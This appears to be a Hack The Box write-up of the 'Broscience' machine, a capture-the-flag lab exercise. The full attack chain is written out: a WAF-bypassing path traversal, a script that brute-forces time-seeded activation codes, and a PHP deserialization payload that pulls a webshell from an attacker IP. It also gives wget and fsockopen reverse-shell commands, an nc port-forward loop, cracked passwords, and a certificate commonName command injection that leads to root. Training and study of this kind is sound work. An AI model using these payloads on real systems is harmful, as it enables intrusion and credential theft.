---
layout: default
title: Broscience
author: k0z4c 
tags: hackthebox
---

## **Finding the Bro**

Scanning the box gives us a mimal attack surface 

![]({% link assets/htb/broscience/nmap.png %})

An authenticated area is found with the chance to register an user but an activation code is needed... 
Looking for some file not indexed within the application the activate.php endpoint is found 

```bash
gobuster dir -u https://broscience.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt -k -x .php
```

![]({% link assets/htb/broscience/gobuster.png %}) 

Poking again  around the web app on 443 an interesting parameter is busted

_https://broscience.htb/includes/img.php?path=**shoulder_press.jpeg**_

After some fuzzing  it turns out that the waf check can be easily bypassed through the encoding of '/'

We can then dump all the source code
```bash
https://broscience.htb/includes/img.php?path=..%252factivate.php
```

and get the algorithm for activation's codes generation 
```bash
https://broscience.htb/includes/img.php?path=..%252fincludes/utils.php
```

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```


now we can script all of this 

```bash
#!/usr/bin/env /bin/bash 
shopt -s nocasematch

if [ $# -lt 1 ]; then 
	echo "./exploit.sh username to register";
	exit
fi

username=$1

echo "[*] registering account $username..."; 
data=$(curl -s -k https://broscience.htb/register.php -d "username=$username&email=$username%40gmail.com&password=password123&password-confirm=password123");

if echo $data | grep -o -i "Username is already taken"; then exit; fi

echo "[*] creating a list of activation codes..";
/usr/bin/php /home/kali/broscience/gencode.php > codes.lst;

echo "[*] bruteforcing activation..."; 
for line in $(cat codes.lst); do 
	echo "[*] trying $line...";
	data=$(curl -s -q -k --proxy http://127.0.0.1:8080 "https://broscience.htb/activate.php?code=$line");
	if  [[ $data =~ activated ]]; then
		echo "[+] Account activated!";
		exit; fi
done; 
```

*gencode.php*

```php
 <?php
function generate_activation_code($t) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    //srand(time());
    srand($t);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$seconds = 100;
$t = time();

for($j = 0; $j <= $seconds; $j++) {
        echo generate_activation_code($t - $j) . "\n";
}
?>
```

![]({% link assets/htb/broscience/activated.png %})

## The foothold

After log in, a cookie called user-prefs is set 
```sh
user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7fQ%3D%3D
```

which decoded in a serialized php object originating from the UserPrefs class
```
{O:9:"UserPrefs":1:{s:5:"theme";s:4:"dark";}
```

Looking through the downloaded sources a vulnerable AvatarInterface class  with the *__wakeup* magic method is spotted 

```php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
```


The deserialization is then easily exploited through the following, 

```php
<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$a = new AvatarInterface();
$a -> imgPath = '/var/www/html/images/kozac_is_hot.php';
$a -> tmp = 'http://10.10.14.212/kozac_is_hot.php';

echo serialize($a) . "\n";
echo "payload: " . urlencode(base64_encode(serialize($a)));
?> 
```

which it's gonna pull a remote webshell on the host. To make the connection more stable, a reverse shell is dropped with 
```
 https://broscience.htb/images/kozac_is_hot.php?cmd=wget%20http://10.10.14.212/p.php
 https://broscience.htb/images/kozac_is_hot.php?cmd=php%20p.php
 ```

![]({% link assets/htb/broscience/revshell.png %})

### Pivoting on the DBMS 

Using the creds found in *db_connect.php*, a local port forward is performed to expose the DBMS

```bash 
 mknod kozac p 
 while :; do nc -lnp 3333  < /tmp/kozac | nc 127.0.0.1 5432 >  /tmp/kozac; done 
```

Credentials are then dumped from the users table and organized with 

```bash
cat dump.txt | cut -d'|' -f2,3 | tr '|' ':' | sed -E 's/\s+//g' | sed  's/$/:NaCl/g'  > hashes
```

so  that hashcat can be fed and the passwords cracked  - md5($salt, $password) , as detailed in the sources
```bash
hashcat  --username -a 0 -m 20 /home/kali/broscience/hashes/hashes --show
```
```
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest // another player... 
kozac:62d19f7e7ddcb5946728776d25e410ed:NaCl:password // here me !
```

Bill's account is the same on the system 

![]({% link assets/htb/broscience/billaccount.png %})

## Privesc 

Looking around a process looking for broscience.crt within /home/bill/Certs is spotted 

![]({% link assets/htb/broscience/certs.png %})

There's a command injection weakness whithin the renew_cert.sh script 
```bash
/bin/bash -c "mv /tmp/temp.crt /home/kali/Certs/$commonName.crt"
```

The weakness is reachable and exploitable so the script is vulnerable.
The exploit is coded through the following  

```bash
#!/bin/bash
# chmod a+x kozac.sh
# php -r '$sock=fsockopen("10.10.14.212",8888);exec("/bin/sh -i <&3 >&3 2>&3");'

# /home/bill/Certs/broscience.crt

commonName='pwned.crt && /tmp/kozac.sh #'
faketime 'last friday 5 pm' /bin/openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 1 <<<"$country
$state
$locality
$organization
$organizationUnit
$commonName
$emailAddress
" 2>/dev/null
```

After placing the reverse shell in tmp and the malicious certificate within bill/certs a root reverse shell is activated
and the box pwned

![]({% link assets/htb/broscience/root.png %})

